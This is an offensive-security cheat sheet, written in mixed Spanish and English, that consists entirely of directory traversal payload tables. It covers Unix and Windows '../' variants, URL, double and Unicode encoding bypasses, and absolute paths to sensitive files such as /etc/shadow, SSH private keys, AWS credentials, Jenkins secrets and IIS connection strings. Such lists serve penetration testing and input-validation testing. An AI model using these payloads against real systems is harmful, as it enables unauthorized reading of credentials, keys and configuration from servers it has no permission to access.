---
aliases:
  - Path Traversal Payloads
  - DotDot Payloads
  - Absolute Path Payloads
tags:
  - type/cheatsheet
  - vuln/path-traversal
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Directory Traversal]]'
---
# Directory Traversal - Payloads Básicos

***

## Unix `../` Traversal

| **Payload** | **Resultado esperado** | **Notas** |
|:---:|:---:|:---:|
| `../etc/passwd` | Read `/etc/passwd` desde 1 nivel | Single up. |
| `../../etc/passwd` | 2 levels up | Most common. |
| `../../../etc/passwd` | 3 levels | Standard. |
| `../../../../etc/passwd` | 4 levels | Aggressive. |
| `../../../../../../../../etc/passwd` | 8+ levels | Force-overshoot — extra `../` ignored normalmente. |
| Trailing slash | `../etc/passwd/` | Algunos parsers normalizan. |
| Leading slash | `/../etc/passwd` | Inconsistent. |
| With dot | `../etc/passwd.` | Trailing dot — Unix accepts. |
| Dot dot dot | `..../etc/passwd` | Some parsers strip pattern. |
| Self-reference | `./` prefix `./../etc/passwd` | No-op + traversal. |
| Multiple self-refs | `././../etc/passwd` | Same. |
| Zero-byte | `../etc/passwd\x00` | Truncate trailing extension. |
| Mixed | `..//../etc/passwd` | Doble-slash. |
| Triple-slash | `..///etc/passwd` | Edge. |
| Tilde expansion | `~/../etc/passwd` | If shell-like resolution. |
^pt-payload-unix

___

## Windows `..\\` Traversal

| **Payload** | **Resultado** | **Notas** |
|:---:|:---:|:---:|
| `..\\windows\\win.ini` | Read win.ini | Standard probe. |
| `..\\..\\windows\\win.ini` | 2 niveles | Common. |
| `..\\..\\..\\windows\\system32\\drivers\\etc\\hosts` | Hosts file | Standard target. |
| Forward slash en Windows | `../windows/win.ini` | Windows acepta forward slash. |
| Mixed slash | `..\\windows/win.ini` o `../windows\\win.ini` | Windows tolerates. |
| Drive letter | `C:\\windows\\win.ini` (sin traversal) | Absolute Windows. |
| With double backslash | `..\\\\..\\\\..\\\\windows\\\\win.ini` | Edge. |
| URL-encoded backslash | `..%5Cwindows%5Cwin.ini` | Encoded. |
| Drive UNC | `\\\\?\\C:\\windows\\win.ini` | UNC paths. |
| Reserved names | `CON`, `NUL`, `PRN`, `LPT1`, `COM1` | Windows reserved devices. |
| Trailing dot | `..\\windows\\win.ini.` | Windows strips trailing dot — bypass extension check. |
| Trailing space | `..\\windows\\win.ini ` | Windows strips trailing space. |
| Short filename (8.3) | `PROGRA~1\\` instead of `Program Files\\` | Legacy 8.3 names. |
| Alt data stream | `file.txt::$DATA` | NTFS specific. |
^pt-payload-windows

___

## Mixed Encoding

| **Payload** | **Resultado** | **Notas** |
|:---:|:---:|:---:|
| Mixed slashes | `..\\..\\../etc/passwd` | Mixed back and forward. |
| Single + URL encoded | `..%2fetc%2fpasswd` | Forward slash encoded. |
| Single backslash encoded | `..%5cetc%5cpasswd` | Backslash encoded. |
| Doble URL encoded `/` | `..%252fetc%252fpasswd` | Multi-decode. |
| Doble URL encoded `\\` | `..%255cetc%255cpasswd` | Same. |
| UTF-8 overlong | `..%c0%afetc%c0%afpasswd` | Overlong UTF-8 (legacy). |
| UTF-16 BOM | `\xfe\xff../etc/passwd` | Edge. |
| Unicode normalization | `..％2Fetc／passwd` (full-width `／`) | NFKC-style. |
| HTML entities | `..&#x2f;etc&#x2f;passwd` | If reflected en HTML. |
| Encoded null | `..%00etc%00passwd` | NUL byte. |
| Hex escape | `..\x2fetc\x2fpasswd` | If literal escape. |
| Octal | `..\057etc\057passwd` | Same. |
| Plus instead of space | `+` decoded a space | URL form-encoded. |
^pt-payload-mixed

___

## Absolute Paths

| **Payload** | **Stack** | **Notas** |
|:---:|:---:|:---:|
| `/etc/passwd` | Linux | Direct, sin traversal. |
| `/etc/shadow` | Linux | Hash file (root-only). |
| `/proc/self/environ` | Linux | Env vars del proceso. |
| `/proc/self/cmdline` | Linux | Command-line args. |
| `/proc/self/status` | Linux | Process status. |
| `/proc/self/maps` | Linux | Memory map. |
| `/proc/version` | Linux | Kernel version. |
| `/proc/self/fd/N` | Linux | File descriptors. |
| `C:\\windows\\win.ini` | Windows | Probe legible. |
| `C:\\windows\\system32\\drivers\\etc\\hosts` | Windows | Hosts. |
| `C:\\inetpub\\wwwroot\\web.config` | Windows IIS | Connection strings. |
| `C:\\xampp\\apache\\conf\\httpd.conf` | Windows Apache | Config. |
| `/var/log/apache2/access.log` | Linux Apache | Logs. |
| `/var/log/nginx/access.log` | Linux nginx | Logs. |
| `/etc/hostname` / `/etc/hosts` | Linux | Network info. |
| `/etc/issue` | Linux | OS version. |
| `/var/www/html/config.php` | Linux PHP app | Config. |
| `/etc/apache2/sites-enabled/default.conf` | Linux Apache config | Site config. |
| `/etc/nginx/sites-enabled/default` | Linux nginx | Same. |
| `~/.ssh/id_rsa` | Linux user home | SSH keys. |
| `~/.bash_history` | Linux | Shell history. |
| `~/.aws/credentials` | Linux | AWS creds. |
| `/root/.ssh/id_rsa` | Linux root | SSH keys. |
| Tomcat conf | `/etc/tomcat9/tomcat-users.xml` | Tomcat creds. |
| Jenkins secrets | `/var/lib/jenkins/secrets.xml` | Jenkins. |
| Git internals | `.git/config`, `.git/HEAD` | Git repo. |
| Webroot | `/var/www/html/`, `C:\\inetpub\\wwwroot\\` | Web docs. |
^pt-payload-absolute

***
